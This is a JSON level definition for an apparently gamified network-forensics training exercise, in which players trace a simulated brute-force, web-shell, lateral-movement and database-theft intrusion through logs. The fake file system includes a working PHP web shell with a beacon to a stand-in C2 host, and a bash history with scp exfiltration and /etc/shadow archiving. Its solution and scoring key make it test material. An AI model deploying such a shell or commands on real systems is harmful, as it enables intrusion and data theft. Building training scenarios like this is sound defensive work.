{
  "id": "level-4",
  "title": "Network Intrusion Analysis",
  "difficulty": "Advanced",
  "description": "A network intrusion has been detected. Analyze network logs and system files to understand the attack timeline and methods used.",
  "scenario": {
    "briefing": "Critical Alert: Our network monitoring systems detected unusual traffic patterns and potential data exfiltration. Multiple systems appear to have been compromised through a sophisticated attack chain. You need to trace the attack from initial compromise to data theft and identify all affected systems.",
    "objective": "Reconstruct the attack timeline, identify the entry point, and determine what data was stolen.",
    "timeLimit": 3600,
    "maxHints": 6
  },
  "environment": {
    "serverName": "security-server-01",
    "osType": "Linux",
    "availableCommands": [
      "ls", "cat", "grep", "find", "head", "tail", "less", "pwd", "cd", "history", "whoami", "ps", "netstat", "last", "awk", "sort", "uniq", "wc", "strings", "file", "xxd", "tcpdump", "wireshark"
    ],
    "fileSystem": {
      "/var/log/suricata/eve.json": {
        "type": "file",
        "content": [
          "{\"timestamp\":\"2024-01-22T02:15:33.445123+0000\",\"flow_id\":1234567890,\"event_type\":\"alert\",\"src_ip\":\"203.0.113.45\",\"dest_ip\":\"192.168.1.100\",\"src_port\":443,\"dest_port\":8080,\"proto\":\"TCP\",\"alert\":{\"action\":\"allowed\",\"gid\":1,\"signature_id\":2001219,\"signature\":\"ET MALWARE Possible Cobalt Strike Beacon Activity\"}}",
          "{\"timestamp\":\"2024-01-22T02:16:15.223456+0000\",\"flow_id\":1234567891,\"event_type\":\"http\",\"src_ip\":\"192.168.1.100\",\"dest_ip\":\"203.0.113.45\",\"src_port\":8080,\"dest_port\":443,\"proto\":\"TCP\",\"http\":{\"hostname\":\"malicious-c2.darknet.org\",\"url\":\"/beacon\",\"http_method\":\"POST\",\"protocol\":\"HTTP/1.1\",\"status\":200,\"length\":2048}}",
          "{\"timestamp\":\"2024-01-22T02:18:22.334567+0000\",\"flow_id\":1234567892,\"event_type\":\"alert\",\"src_ip\":\"192.168.1.100\",\"dest_ip\":\"192.168.1.50\",\"src_port\":445,\"dest_port\":445,\"proto\":\"TCP\",\"alert\":{\"action\":\"allowed\",\"gid\":1,\"signature_id\":2100498,\"signature\":\"GPL NETBIOS SMB Session Setup ANDX Request\"}}",
          "{\"timestamp\":\"2024-01-22T02:20:45.445678+0000\",\"flow_id\":1234567893,\"event_type\":\"fileinfo\",\"src_ip\":\"192.168.1.100\",\"dest_ip\":\"203.0.113.45\",\"src_port\":443,\"dest_port\":443,\"proto\":\"TCP\",\"fileinfo\":{\"filename\":\"customer_database.zip\",\"size\":156789123,\"md5\":\"d41d8cd98f00b204e9800998ecf8427e\"}}",
          "{\"timestamp\":\"2024-01-22T02:22:11.556789+0000\",\"flow_id\":1234567894,\"event_type\":\"alert\",\"src_ip\":\"192.168.1.50\",\"dest_ip\":\"203.0.113.45\",\"src_port\":443,\"dest_port\":443,\"proto\":\"TCP\",\"alert\":{\"action\":\"allowed\",\"gid\":1,\"signature_id\":2013504,\"signature\":\"ET POLICY PE EXE or DLL Windows file download HTTP\"}}"
        ]
      },
      "/var/log/auth.log": {
        "type": "file",
        "content": [
          "2024-01-22 02:10:15 web-server-01 sshd[3456]: Failed password for admin from 203.0.113.45 port 22 ssh2",
          "2024-01-22 02:11:33 web-server-01 sshd[3456]: Failed password for root from 203.0.113.45 port 22 ssh2",
          "2024-01-22 02:12:45 web-server-01 sshd[3456]: Failed password for backup from 203.0.113.45 port 22 ssh2",
          "2024-01-22 02:14:22 web-server-01 sshd[3456]: Accepted password for webadmin from 203.0.113.45 port 22 ssh2",
          "2024-01-22 02:15:33 web-server-01 sudo: webadmin : TTY=pts/0 ; PWD=/home/webadmin ; USER=root ; COMMAND=/bin/bash",
          "2024-01-22 02:16:45 database-server sshd[7890]: Accepted publickey for dbuser from 192.168.1.100 port 22 ssh2",
          "2024-01-22 02:17:22 database-server sudo: dbuser : TTY=pts/1 ; PWD=/home/dbuser ; USER=root ; COMMAND=/usr/bin/mysqldump --all-databases"
        ]
      },
      "/var/log/apache2/access.log": {
        "type": "file",
        "content": [
          "203.0.113.45 - - [22/Jan/2024:02:13:45 +0000] \"POST /admin/upload.php HTTP/1.1\" 200 1234 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\"",
          "203.0.113.45 - - [22/Jan/2024:02:14:15 +0000] \"GET /uploads/shell.php HTTP/1.1\" 200 567 \"-\" \"Mozilla/5.0 (compatible; C2 Client)\"",
          "203.0.113.45 - - [22/Jan/2024:02:15:30 +0000] \"POST /uploads/shell.php HTTP/1.1\" 200 2048 \"-\" \"Mozilla/5.0 (compatible; C2 Client)\"",
          "203.0.113.45 - - [22/Jan/2024:02:16:45 +0000] \"POST /uploads/shell.php HTTP/1.1\" 200 4096 \"-\" \"Mozilla/5.0 (compatible; C2 Client)\""
        ]
      },
      "/tmp/uploads/shell.php": {
        "type": "file",
        "content": [
          "<?php",
          "// Web shell uploaded by attacker",
          "$cmd = $_POST['cmd'];",
          "if($cmd) {",
          "    echo \"<pre>\";",
          "    system($cmd);",
          "    echo \"</pre>\";",
          "}",
          "// Beacon functionality",
          "function beacon() {",
          "    $c2_server = 'malicious-c2.darknet.org';",
          "    $data = base64_encode(gethostname() . '|' . getcwd());",
          "    file_get_contents('https://' . $c2_server . '/beacon?data=' . $data);",
          "}",
          "beacon();",
          "?>"
        ]
      },
      "/home/webadmin/.bash_history": {
        "type": "file",
        "content": [
          "whoami",
          "sudo su -",
          "ps aux | grep mysql",
          "netstat -tulpn | grep :3306",
          "ssh dbuser@192.168.1.50",
          "scp -r /var/www/uploads/ backup@203.0.113.45:/tmp/",
          "find / -name '*.sql' 2>/dev/null",
          "mysqldump -u root -p --all-databases > /tmp/database_backup.sql",
          "tar -czf /tmp/sensitive_data.tar.gz /home/users/ /etc/passwd /etc/shadow",
          "python3 -m http.server 8080",
          "history -c"
        ]
      },
      "/var/log/mysql/mysql.log": {
        "type": "file",
        "content": [
          "2024-01-22 02:17:30 [Warning] Access denied for user 'root'@'192.168.1.100' (using password: YES)",
          "2024-01-22 02:17:45 [Note] Connection established for user 'dbuser'@'192.168.1.100'",
          "2024-01-22 02:18:00 [Query] SELECT * FROM users WHERE admin = 1",
          "2024-01-22 02:18:15 [Query] SELECT customer_id, name, email, credit_card FROM customers",
          "2024-01-22 02:18:30 [Query] SELECT * FROM financial_records WHERE amount > 10000",
          "2024-01-22 02:19:00 [Warning] Large result set: 45,000 rows returned",
          "2024-01-22 02:19:30 [Note] Database dump initiated by dbuser"
        ]
      },
      "/tmp/network_analysis.txt": {
        "type": "file",
        "content": [
          "NETWORK INTRUSION ANALYSIS REPORT",
          "=================================",
          "",
          "ATTACK TIMELINE:",
          "02:10 - SSH brute force attack from 203.0.113.45",
          "02:14 - Successful login as 'webadmin'",
          "02:13 - Web shell uploaded via admin panel",
          "02:15 - Privilege escalation to root",
          "02:16 - Lateral movement to database server",
          "02:18 - Database enumeration and data theft",
          "02:20 - Data exfiltration (156MB compressed)",
          "",
          "COMPROMISE CHAIN:",
          "1. Initial Access: SSH brute force → webadmin account",
          "2. Persistence: Web shell deployment",
          "3. Privilege Escalation: sudo access",
          "4. Lateral Movement: SSH to database server",
          "5. Data Collection: MySQL database dump",
          "6. Exfiltration: HTTPS transfer to C2 server",
          "",
          "STOLEN DATA:",
          "- Complete customer database (45,000 records)",
          "- User credentials and admin accounts",
          "- Financial records and credit card data",
          "- System configuration files",
          "",
          "C2 INFRASTRUCTURE:",
          "- Primary: malicious-c2.darknet.org (203.0.113.45)",
          "- Protocol: HTTPS beacon with base64 encoding",
          "- Tool: Custom web shell + Cobalt Strike beacon"
        ]
      }
    }
  },
  "clues": [
    {
      "id": "clue-1",
      "title": "Initial Compromise",
      "description": "The attack began with a brute force attack against SSH services.",
      "hint": "Check authentication logs for failed and successful login attempts",
      "triggerCommands": ["cat /var/log/auth.log", "grep -i failed /var/log/auth.log"],
      "revealed": false
    },
    {
      "id": "clue-2",
      "title": "Web Shell Deployment",
      "description": "A malicious web shell was uploaded to maintain persistence.",
      "hint": "Look at web server access logs and uploaded files",
      "triggerCommands": ["cat /var/log/apache2/access.log", "cat /tmp/uploads/shell.php"],
      "revealed": false
    },
    {
      "id": "clue-3",
      "title": "Command and Control",
      "description": "The malware established communication with an external C2 server.",
      "hint": "Examine network monitoring logs for suspicious beacon activity",
      "triggerCommands": ["grep beacon /var/log/suricata/eve.json", "grep malicious-c2 /var/log/suricata/eve.json"],
      "revealed": false
    },
    {
      "id": "clue-4",
      "title": "Lateral Movement",
      "description": "The attacker moved from the web server to the database server.",
      "hint": "Check command history and network logs for connections between internal systems",
      "triggerCommands": ["cat /home/webadmin/.bash_history", "grep 192.168.1.50 /var/log/auth.log"],
      "revealed": false
    },
    {
      "id": "clue-5",
      "title": "Database Compromise",
      "description": "Sensitive database information was accessed and stolen.",
      "hint": "Look at MySQL logs for database queries and dump operations",
      "triggerCommands": ["cat /var/log/mysql/mysql.log", "grep dump /var/log/mysql/mysql.log"],
      "revealed": false
    },
    {
      "id": "clue-6",
      "title": "Data Exfiltration",
      "description": "Large amounts of data were transferred to the attacker's servers.",
      "hint": "Check network logs for large file transfers and uploads",
      "triggerCommands": ["grep fileinfo /var/log/suricata/eve.json", "grep customer_database /var/log/suricata/eve.json"],
      "revealed": false
    }
  ],
  "solution": {
    "steps": [
      "Identify the initial SSH brute force attack from 203.0.113.45",
      "Trace successful login as webadmin user",
      "Discover web shell upload through admin panel",
      "Follow privilege escalation to root access",
      "Track lateral movement to database server via SSH",
      "Analyze database queries showing data enumeration",
      "Identify data exfiltration through C2 communication",
      "Calculate total scope of compromised data"
    ],
    "finalAnswer": "/tmp/network_analysis.txt",
    "explanation": "Multi-stage attack: SSH brute force → web shell → privilege escalation → lateral movement → database theft → data exfiltration. Attacker stole 156MB of sensitive data including 45,000 customer records, financial data, and system credentials through sophisticated C2 infrastructure."
  },
  "scoring": {
    "maxScore": 2500,
    "timeBonus": 600,
    "hintPenalty": 200,
    "wrongCommandPenalty": 150
  }
}
